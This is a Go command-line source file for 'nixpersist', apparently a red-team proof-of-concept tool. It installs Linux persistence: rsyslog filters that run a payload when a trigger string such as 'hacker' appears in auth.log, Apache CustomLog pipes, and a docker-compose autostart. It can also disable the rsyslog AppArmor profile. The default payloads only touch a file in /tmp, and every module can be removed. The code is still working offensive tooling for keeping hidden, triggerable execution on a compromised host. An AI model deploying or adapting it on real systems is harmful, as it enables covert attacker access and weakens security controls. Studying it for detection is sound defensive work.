package main

import (
	"errors"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/spf13/pflag"

	"nixpersist/internal/apachelog"
	"nixpersist/internal/dockercompose"
	"nixpersist/internal/rsyslog"
)

var version = "0.0.0-dev"

func main() {
	root := pflag.NewFlagSet("nixpersist", pflag.ContinueOnError)
	root.SortFlags = false
	root.SetOutput(os.Stdout)
	root.SetInterspersed(false)
	root.Usage = func() {
		printMainMenu(root.Output())
	}

	showVersion := root.Bool("version", false, "print version and exit")
	if err := root.Parse(os.Args[1:]); err != nil {
		if errors.Is(err, pflag.ErrHelp) {
			return
		}
		fmt.Fprintln(os.Stderr, err)
		os.Exit(2)
	}

	if *showVersion {
		fmt.Println("nixpersist", version)
		return
	}

	args := root.Args()
	if len(args) == 0 {
		root.Usage()
		return
	}

	module := args[0]
	moduleArgs := args[1:]

	var err error
	switch module {
	case "rsyslog-omprog":
		err = runRsyslogOmprog(moduleArgs)
	case "rsyslog":
		err = runRsyslogShell(moduleArgs)
	case "docker-compose":
		err = runDockerCompose(moduleArgs)
	case "apache-log":
		err = runApacheLog(moduleArgs)
	case "help":
		root.Usage()
		return
	default:
		err = fmt.Errorf("unknown module %q", module)
	}

	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		fmt.Fprintln(os.Stderr)
		root.Usage()
		os.Exit(1)
	}
}

func runRsyslogOmprog(args []string) error {
	fs := pflag.NewFlagSet("nixpersist rsyslog-omprog", pflag.ContinueOnError)
	fs.SortFlags = false
	fs.Usage = func() {
		fmt.Fprintln(fs.Output(), "Usage: nixpersist rsyslog-omprog [--check|--install|--remove] [--apparmor] [flags]")
		fmt.Fprintln(fs.Output())
		fmt.Fprintln(fs.Output(), "Flags:")
		fs.PrintDefaults()
	}

	doCheck := fs.Bool("check", false, "check system feasibility and exit")
	doInstall := fs.Bool("install", false, "Installs triggerable rsyslog filter (disables AppArmor profile if required)")
	doRemove := fs.Bool("remove", false, "Removes the NixPersist rsyslog drop-in and reloads rsyslog")
	manageAppArmor := fs.Bool("apparmor", false, "manage the rsyslog AppArmor profile (disable on install, re-enable on remove)")
	in := fs.StringP("log-file-in", "l", "/var/log/auth.log", "log file to monitor (imfile)")
	out := fs.StringP("outfile", "o", "", "write rendered config to this file (default stdout)")
	payload := fs.StringP("payload", "p", "/usr/bin/touch /tmp/nixpersist", "payload binary to execute (omprog)")
	payloadArgs := fs.String("payload-args", "", "optional arguments for payload binary")
	trigger := fs.StringP("trigger", "t", "uhtavi0", "message substring to trigger on")

	if err := fs.Parse(args); err != nil {
		if errors.Is(err, pflag.ErrHelp) {
			return nil
		}
		return err
	}

	if fs.NArg() > 0 {
		return fmt.Errorf("unexpected arguments for rsyslog-omprog module: %s", strings.Join(fs.Args(), ", "))
	}

	if fs.NFlag() == 0 {
		fs.Usage()
		return nil
	}

	actions := 0
	if *doCheck {
		actions++
	}
	if *doInstall {
		actions++
	}
	if *doRemove {
		actions++
	}
	if actions > 1 {
		return errors.New("choose at most one of --check, --install, or --remove")
	}
	if *manageAppArmor && actions == 0 {
		return errors.New("--apparmor requires --install or --remove")
	}

	if *doCheck {
		res := rsyslog.Check()
		fmt.Print(res.Render())
		return nil
	}

	if *doRemove {
		if *manageAppArmor {
			if err := rsyslog.EnableRsyslogProfile(); err != nil {
				return fmt.Errorf("failed to re-enable AppArmor profile: %w", err)
			}
		}
		msg := "remove complete: /etc/rsyslog.d/99-nixpersist.conf removed and rsyslog reloaded"
		if *manageAppArmor {
			msg += "; AppArmor profile re-enabled"
		}
		if err := rsyslog.Remove(); err != nil {
			return fmt.Errorf("remove failed: %w", err)
		}
		fmt.Println(msg)
		return nil
	}

	// Render using PoC defaults
	cfg, err := rsyslog.RenderConfig(rsyslog.ConfigParams{
		InputFile:       *in,
		Tag:             "access",
		Severity:        "info",
		Facility:        "local6",
		AddMetadata:     true,
		PollingInterval: 10,
		FilterByTag:     true,
		FilterContains:  *trigger,
		ProgramPath:     *payload,
		ProgramArgs:     *payloadArgs,
		// Default ruleset is required for isolation and future expansion.
		UseRuleset:  true,
		RulesetName: "event_router",
	})
	if err != nil {
		return err
	}

	if *doInstall {
		res := rsyslog.Check()
		if *manageAppArmor {
			if err := rsyslog.DisableRsyslogProfile(); err != nil {
				return fmt.Errorf("failed to disable AppArmor profile: %w", err)
			}
		} else if res.RsyslogAppArmorProtected {
			fmt.Fprintln(os.Stderr, "warning: rsyslog AppArmor profile is enforced; run with --apparmor to disable before install")
		}
		if err := rsyslog.Install(cfg); err != nil {
			return fmt.Errorf("install failed: %w", err)
		}
		msg := "install complete: /etc/rsyslog.d/99-nixpersist.conf applied and rsyslog reloaded"
		if *manageAppArmor {
			msg += "; AppArmor profile disabled"
		}
		fmt.Println(msg)
		return nil
	}

	if *in == "" || *payload == "" || *trigger == "" {
		return errors.New("rsyslog-omprog render requires -l/--log-file-in, -p/--payload, and -t/--trigger")
	}

	if *out == "" {
		fmt.Print(cfg)
		return nil
	}

	if err := os.WriteFile(*out, []byte(cfg), 0644); err != nil {
		return fmt.Errorf("write failed: %w", err)
	}

	return nil
}

func runRsyslogShell(args []string) error {
	fs := pflag.NewFlagSet("nixpersist rsyslog", pflag.ContinueOnError)
	fs.SortFlags = false
	fs.Usage = func() {
		fmt.Fprintln(fs.Output(), "Usage: nixpersist rsyslog [--check|--install|--remove] [--apparmor] [flags]")
		fmt.Fprintln(fs.Output())
		fmt.Fprintln(fs.Output(), "Flags:")
		fs.PrintDefaults()
	}

	doCheck := fs.Bool("check", false, "check system feasibility and exit")
	doInstall := fs.Bool("install", false, "Append triggerable shell filter to rsyslog.conf")
	doRemove := fs.Bool("remove", false, "Remove the NixPersist shell snippet and reload rsyslog")
	manageAppArmor := fs.Bool("apparmor", false, "manage the rsyslog AppArmor profile (disable on install, re-enable on remove)")
	trigger := fs.StringP("trigger", "t", "hacker", "message substring to trigger on")
	payload := fs.StringP("payload", "p", "/usr/bin/touch /tmp/nixpersiste", "payload binary to execute via shell")
	output := fs.StringP("output", "o", rsyslog.DefaultShellConfigPath, "path to append the rendered configuration")

	if err := fs.Parse(args); err != nil {
		if errors.Is(err, pflag.ErrHelp) {
			return nil
		}
		return err
	}

	if fs.NArg() > 0 {
		return fmt.Errorf("unexpected arguments for rsyslog module: %s", strings.Join(fs.Args(), ", "))
	}

	if fs.NFlag() == 0 {
		fs.Usage()
		return nil
	}

	actions := 0
	if *doCheck {
		actions++
	}
	if *doInstall {
		actions++
	}
	if *doRemove {
		actions++
	}
	if actions > 1 {
		return errors.New("choose at most one of --check, --install, or --remove")
	}
	if *manageAppArmor && actions == 0 {
		return errors.New("--apparmor requires --install or --remove")
	}

	if *doCheck {
		res := rsyslog.Check()
		fmt.Print(res.Render())
		return nil
	}

	if *doRemove {
		if *manageAppArmor {
			if err := rsyslog.EnableRsyslogProfile(); err != nil {
				return fmt.Errorf("failed to re-enable AppArmor profile: %w", err)
			}
		}
		if err := rsyslog.RemoveShell(*output); err != nil {
			return fmt.Errorf("remove failed: %w", err)
		}
		msg := fmt.Sprintf("remove complete: NixPersist shell snippet removed from %s and rsyslog reloaded", *output)
		if *manageAppArmor {
			msg += "; AppArmor profile re-enabled"
		}
		fmt.Println(msg)
		return nil
	}

	params := rsyslog.ShellConfigParams{
		Trigger: *trigger,
		Payload: *payload,
	}
	cfg, err := rsyslog.RenderShellConfig(params)
	if err != nil {
		return err
	}

	if *doInstall {
		res := rsyslog.Check()
		if *manageAppArmor {
			if err := rsyslog.DisableRsyslogProfile(); err != nil {
				return fmt.Errorf("failed to disable AppArmor profile: %w", err)
			}
		} else if res.RsyslogAppArmorProtected {
			fmt.Fprintln(os.Stderr, "warning: rsyslog AppArmor profile is enforced; run with --apparmor to disable before install")
		}
		if err := rsyslog.InstallShell(cfg, *output); err != nil {
			return fmt.Errorf("install failed: %w", err)
		}
		msg := fmt.Sprintf("install complete: shell snippet appended to %s and rsyslog reloaded", *output)
		if *manageAppArmor {
			msg += "; AppArmor profile disabled"
		}
		fmt.Println(msg)
		return nil
	}

	if strings.TrimSpace(*trigger) == "" || strings.TrimSpace(*payload) == "" {
		return errors.New("rsyslog render requires -t/--trigger and -p/--payload")
	}

	outFlag := fs.Lookup("output")
	if outFlag != nil && outFlag.Changed {
		if err := os.WriteFile(*output, []byte(cfg), 0644); err != nil {
			return fmt.Errorf("write failed: %w", err)
		}
		fmt.Printf("render complete: shell snippet written to %s\n", *output)
		return nil
	}

	fmt.Print(cfg)
	return nil
}
func runDockerCompose(args []string) error {
	fs := pflag.NewFlagSet("nixpersist docker-compose", pflag.ContinueOnError)
	fs.SortFlags = false
	fs.Usage = func() {
		fmt.Fprintln(fs.Output(), "Usage: nixpersist docker-compose [--check|--install|--remove] [flags]")
		fmt.Fprintln(fs.Output())
		fmt.Fprintln(fs.Output(), "Flags:")
		fs.PrintDefaults()
	}

	doCheck := fs.Bool("check", false, "Check for docker privileges and local images available")
	doInstall := fs.Bool("install", false, "create docker-compose.yml, launch with docker compose up")
	doRemove := fs.Bool("remove", false, "stop the docker-compose deployment and delete the compose file")
	payload := fs.StringP("payload", "p", "", "path to payload on HOST filesystem")
	image := fs.StringP("image", "i", "alpine:latest", "container image to launch, will download if required")
	name := fs.StringP("name", "n", "compose-nixpersist", "service/container name for docker-compose")
	output := fs.StringP("output", "o", "/opt/compose-nixpersist", "directory to place docker-compose.yml")

	if err := fs.Parse(args); err != nil {
		if errors.Is(err, pflag.ErrHelp) {
			return nil
		}
		return err
	}

	if fs.NArg() > 0 {
		return fmt.Errorf("unexpected arguments for docker-compose module: %s", strings.Join(fs.Args(), ", "))
	}

	actions := 0
	if *doCheck {
		actions++
	}
	if *doInstall {
		actions++
	}
	if *doRemove {
		actions++
	}
	if actions == 0 {
		fs.Usage()
		return nil
	}
	if actions > 1 {
		return errors.New("choose at most one of --check, --install, or --remove")
	}

	if *doCheck {
		res := dockercompose.Check()
		fmt.Print(res.Render())
		return nil
	}

	if *doRemove {
		if strings.TrimSpace(*output) == "" {
			return errors.New("--output directory is required for --remove")
		}
		if err := dockercompose.Remove(*output); err != nil {
			return err
		}
		fmt.Printf("remove complete: docker compose down and %s removed\n", dockercompose.DefaultComposeName)
		return nil
	}

	// Installation path.
	if strings.TrimSpace(*payload) == "" {
		return errors.New("--payload is required for --install")
	}
	if strings.TrimSpace(*image) == "" {
		return errors.New("--image is required for --install")
	}
	if strings.TrimSpace(*name) == "" {
		return errors.New("--name is required for --install")
	}
	if strings.TrimSpace(*output) == "" {
		return errors.New("--output directory is required for --install")
	}

	params := dockercompose.ConfigParams{
		ServiceName:    *name,
		Image:          *image,
		PayloadCommand: *payload,
	}
	cfg, err := dockercompose.RenderConfig(params)
	if err != nil {
		return err
	}

	res := dockercompose.Check()
	if !res.HasAccess() {
		fmt.Fprintln(os.Stderr, "warning: docker commands may fail (insufficient permissions or daemon unavailable)")
	}

	path, err := dockercompose.Install(cfg, *output)
	if err != nil {
		return err
	}

	fmt.Printf("install complete: %s written and docker compose up started (service %s)\n", path, *name)
	return nil
}

func runApacheLog(args []string) error {
	fs := pflag.NewFlagSet("nixpersist apache-log", pflag.ContinueOnError)
	fs.SortFlags = false
	fs.Usage = func() {
		fmt.Fprintln(fs.Output(), "Usage: nixpersist apache-log [--check|--install|--remove] [flags]")
		fmt.Fprintln(fs.Output())
		fmt.Fprintln(fs.Output(), "Flags:")
		fs.PrintDefaults()
	}

	doCheck := fs.Bool("check", false, "check Apache prerequisites and exit")
	doInstall := fs.Bool("install", false, "append CustomLog pipe to the Apache configuration")
	doRemove := fs.Bool("remove", false, "remove the NixPersist CustomLog pipe from the Apache configuration")
	payload := fs.StringP("payload", "p", "", "path to executable payload invoked via CustomLog")
	confPath := fs.StringP("conf", "c", apachelog.DefaultConfPath, "path to apache2.conf")
	noRestart := fs.Bool("no-restart", false, "skip restarting apache2 service after changes")

	if err := fs.Parse(args); err != nil {
		if errors.Is(err, pflag.ErrHelp) {
			return nil
		}
		return err
	}

	if fs.NArg() > 0 {
		return fmt.Errorf("unexpected arguments for apache-log module: %s", strings.Join(fs.Args(), ", "))
	}

	if fs.NFlag() == 0 {
		fs.Usage()
		return nil
	}

	actions := 0
	if *doCheck {
		actions++
	}
	if *doInstall {
		actions++
	}
	if *doRemove {
		actions++
	}
	if actions == 0 {
		fs.Usage()
		return nil
	}
	if actions > 1 {
		return errors.New("choose at most one of --check, --install, or --remove")
	}
	if *noRestart && !(*doInstall || *doRemove) {
		return errors.New("--no-restart requires --install or --remove")
	}
	if strings.TrimSpace(*confPath) == "" {
		return errors.New("--conf path must not be empty")
	}

	if *doCheck {
		res := apachelog.Check(*confPath)
		fmt.Print(res.Render())
		return nil
	}

	restart := !*noRestart

	if *doRemove {
		if err := apachelog.Remove(*confPath, restart); err != nil {
			return fmt.Errorf("remove failed: %w", err)
		}
		msg := fmt.Sprintf("remove complete: apache-log snippet removed from %s", *confPath)
		if restart {
			msg += "; apache2 restarted"
		} else {
			msg += "; restart skipped"
		}
		fmt.Println(msg)
		return nil
	}

	if strings.TrimSpace(*payload) == "" {
		return errors.New("--payload is required for --install")
	}

	params := apachelog.ConfigParams{
		Payload: *payload,
	}
	if err := apachelog.Install(params, *confPath, restart); err != nil {
		return fmt.Errorf("install failed: %w", err)
	}
	msg := fmt.Sprintf("install complete: apache-log CustomLog pipe appended to %s", *confPath)
	if restart {
		msg += "; apache2 restarted"
	} else {
		msg += "; restart skipped"
	}
	fmt.Println(msg)
	return nil
}

func printMainMenu(out io.Writer) {
	const intro = `Usage: nixpersist [module] [flags]

Available persistence modules:
  apache-log       Autostart persistence via Apache Logging Pipes
  docker-compose   Autostart persistence via docker-compose file
  rsyslog          Triggerable rsyslog filter (shell execute)
  rsyslog-omprog   Triggerable rsyslog filter using imfile + omprog drop-in

Examples:
  nixpersist rsyslog --check
  nixpersist rsyslog --install -t hacker -p /usr/local/bin/payload
  nixpersist rsyslog-omprog --check
  nixpersist docker-compose --check`

	fmt.Fprintln(out, intro)
}
